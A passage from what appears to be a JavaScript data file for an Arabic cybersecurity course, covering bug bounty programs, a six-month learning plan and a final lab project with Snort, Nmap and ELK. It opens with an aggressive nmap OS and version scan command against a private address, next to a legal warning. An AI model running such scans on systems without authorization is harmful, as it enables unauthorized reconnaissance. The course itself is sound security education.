# اكتشاف نظام التشغيل والإصدارات
nmap -sV -O -A 192.168.1.1
        </div>
        <div class="warning-box">
          <i class="fas fa-gavel"></i> <strong>قانوني:</strong> لا تختبر أبداً نظاماً ليس لديك إذن كتابي باختباره. استخدم منصات تدريب قانونية مثل TryHackMe، HackTheBox، أو مختبرات افتراضية.
        </div>
      `
    },
    {
      number: 25,
      title: '[متقدم] برامج مكافحة الثغرات (Bug Bounty) وكسب المال القانوني',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس والعشرون: حوافز لاكتشاف الثغرات</h2>
        <p>برامج مكافأة الثغرات (Bug Bounty) هي منصات قانونية تدفع مكافآت مالية لمن يكتشف ثغرات في أنظمة الشركات المشاركة. منصات مشهورة:</p>
        <ul>
          <li><strong>HackerOne</strong> – أكبر منصة عالمياً.</li>
          <li><strong>Bugcrowd</strong> – منصة شهيرة.</li>
          <li><strong>Intigriti</strong> – أوروبية.</li>
          <li><strong>برامج عربية:</strong> بعض الشركات العربية لديها برامج خاصة (ابحث عن "Bug Bounty" في منطقتك).</li>
        </ul>
        <p>كيف تبدأ؟</p>
        <ol>
          <li>أنشئ حساباً على المنصة.</li>
          <li>أكمل تدريباً أساسياً (مثل "Bug Bounty Hunter" من HackerOne).</li>
          <li>اختر برنامجاً مفتوحاً للمبتدئين (غالباً ذات نطاق محدود).</li>
          <li>اتبع قواعد البرنامج بدقة – لا تختبر خارج النطاق أبداً.</li>
          <li>دوّن الثغرات وقدم تقريراً واضحاً.</li>
        </ol>
        <div class="note-box">
          💰 <strong>معلومة:</strong> متوسط المكافأة لثغرة متوسطة الخطورة يتراوح بين 500 و 2000 دولار أمريكي. الثغرات الحرجة قد تصل إلى 10,000 دولار أو أكثر.
        </div>
      `
    },
    {
      number: 26,
      title: '[متقدم] خطة التعلم لمدة 6 أشهر لتصبح محلل أمني',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس والعشرون: من أين تبدأ بعد هذا الكورس؟</h2>
        <p>إليك خطة زمنية مقترحة (6 أشهر) للانتقال من الصفر إلى وظيفة محلل أمني مبتدئ:</p>
        <ul>
          <li><strong>الشهر 1-2:</strong> إتقان أساسيات الشبكات وأنظمة التشغيل (ويندوز ولينكس). الحصول على شهادة CompTIA Network+ أو Security+.</li>
          <li><strong>الشهر 3-4:</strong> التدريب العملي على منصات مثل TryHackMe (مسار "Pre Security" و "SOC Level 1"). بناء مشروع صغير (مثل تركيب ELK Stack وتحليل سجلات محلية).</li>
          <li><strong>الشهر 5:</strong> التخصص في مسار معين (اختر: SOC Analyst، Red Team، Blue Team، GRC، Forensics، Malware). ادرس منهج متخصص.</li>
          <li><strong>الشهر 6:</strong> الحصول على شهادة معترف بها (مثل CompTIA Security+، BTL1، eJPT). بناء محفظة أعمال (على GitHub أو LinkedIn) تشمل مشاريعك.</li>
        </ul>
        <div class="note-box">
          🎯 <strong>هدف نهائي:</strong> بعد 6-12 شهراً من الالتزام، يمكنك التقدم لوظائف "Security Analyst" أو "SOC Analyst" في الشركات.
        </div>
      `
    },
    {
      number: 27,
      title: '[متقدم] مراجعة المستوى الثالث والمشروع النهائي',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع والعشرون: اختبار المستوى المتقدم والمشروع الختامي</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>اكتب سكريبت بايثون يقوم بفحص ما إذا كان منفذ معين مفتوح على جهاز بعيد.</li>
          <li>ما الفرق بين Security of the Cloud و Security in the Cloud؟</li>
          <li>اذكر ثلاثة أنواع من Google Dorks المفيدة لجمع المعلومات.</li>
          <li>ما هي العناصر الأساسية التي يجب أن تتضمنها سياسة أمن المعلومات؟</li>
          <li>اشرح الفرق بين التحليل الساكن والديناميكي للمالفير.</li>
          <li>ما هي مراحل اختبار الاختراق الأخلاقي؟</li>
          <li>كيف يمكن كسب المال بشكل قانوني من اكتشاف الثغرات؟</li>
        </ol>
        <p><strong>المشروع النهائي (شامل):</strong></p>
        <ul>
          <li>أنشئ مختبراً افتراضياً يحتوي على جهازي لينكس وويندوز وجهاز مهاجم (Kali Linux).</li>
          <li>قم بتثبيت Snort IDS على أحد الأجهزة.</li>
          <li>استخدم Nmap لمسح الشبكة من جهاز المهاجم وسجل التنبيهات التي يولدها Snort.</li>
          <li>قم بتثبيت ELK Stack (أو Wazuh) على جهاز منفصل وجمع السجلات من أجهزة المختبر.</li>
          <li>اكتب تقريراً من 3-5 صفحات يشرح هيكل المختبر، الثغرات التي اكتشفتها، وكيفية إصلاحها.</li>
        </ul>
        <p>بعد إتمام هذا المشروع، ستكون قد طبقت تقريباً جميع المفاهيم التي تعلمتها في هذا الكورس.</p>
      `
    },
  ],
};
